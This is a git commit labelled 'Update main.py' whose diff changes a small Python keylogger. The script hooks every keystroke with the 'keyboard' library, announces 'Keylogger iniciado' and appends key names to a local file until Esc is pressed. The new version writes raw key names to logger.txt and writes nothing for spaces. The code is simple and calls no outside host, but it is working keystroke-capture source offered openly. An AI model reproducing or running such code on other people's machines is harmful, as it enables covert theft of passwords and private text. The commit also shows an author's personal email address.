50c76305846c0b2ddc58b42550c30d08f075cb1e
swariggg <arianaremache2007@gmail.com>
2025-10-21 11:42:26 -0500

    Update main.py

--- main.py
+++ main.py
@@ -1,12 +1,10 @@
 import keyboard
-
 def on_key(event):
-    if event.event_type == keyboard.KEY_DOWN:
-        key = event.name.upper() if len(event.name) > 1 else event.name
-        print(f"Tecla: {key}")
-        with open("log.txt", "a", encoding="utf-8") as f:
-            f.write(f"{key}\n")
-
+    with open('logger.txt', 'a') as file:
+        if event.name == 'space':
+            file.write('')
+        else:
+            file.write(event.name)
 print("Keylogger iniciado. Presiona 'Esc' para detener.")
 keyboard.hook(on_key)
 keyboard.wait('esc')
